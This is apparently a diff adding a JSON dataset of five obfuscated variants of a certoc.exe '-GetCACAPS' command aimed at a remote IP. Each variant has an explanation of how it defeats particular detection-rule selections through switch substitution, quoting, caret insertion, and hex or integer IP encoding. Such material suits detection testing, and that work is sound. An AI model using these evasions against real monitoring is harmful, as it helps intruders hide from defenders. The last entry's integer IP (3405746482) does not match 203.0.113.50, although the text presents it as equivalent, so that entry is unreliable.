@@ -1,0 +1,22 @@
+[
+  {
+    "output": "CERTOC.EXE /GetCACAPS http://203.0.113.50/CertSrv/",
+    "explanation": "Substitution technique: Built-in Microsoft binaries leveraging standard Windows CLI parsing frameworks accept forward slashes ('/') interchangeable with hyphens ('-') for switch parameters. Substituting '-GetCACAPS' with '/GetCACAPS' breaks the strict string detection in 'selection_cli' while processing the flag identically."
+  },
+  {
+    "output": "CERTOC.EXE \"-GetCACAPS\" http://203.0.113.50/CertSrv/",
+    "explanation": "Insertion technique: Enclosing the action parameter switch in double quotes ('\"-GetCACAPS\"') interrupts the continuous literal character string matching rules monitoring the command line. The native Windows argument tokenizer automatically unquotes parameters during execution initialization, keeping the functional network request behavior intact."
+  },
+  {
+    "output": "cmd.exe /c CERTOC.EXE -GetCA^CAPS http://203.0.113.50/CertSrv/",
+    "explanation": "Insertion technique: Spawning the binary through cmd.exe permits the insertion of a command shell caret escape character ('^') directly into the switch token. The outer processor strips the caret token before process execution, logging '-GetCA^CAPS' in process creation telemetry and evading 'selection_cli'."
+  },
+  {
+    "output": "CERTOC.EXE -GetCACAPS http://0xCB.0x00.0x71.0x32/CertSrv/",
+    "explanation": "Recoding / Encoding technique: Representing the target IPv4 address using hexadecimal octet notation ('0xCB.0x00.0x71.0x32') instead of standard dotted-decimal formatting. The Windows socket and network layer natively decode alternative IP address formats automatically, which successfully evades the 'selection_ip' regular expression constraint."
+  },
+  {
+    "output": "CERTOC.EXE -GetCACAPS http://3405746482/CertSrv/",
+    "explanation": "Recoding / Encoding technique: Converts the IP based URL to its equivalent Dword/Integer representation (3405746482). The underlying Windows network stack handles the conversion transparently to route traffic to the intended lab target, while completely subverting the 'selection_ip' literal regex pattern tracking standard four-octet dot notation."
+  }
+]
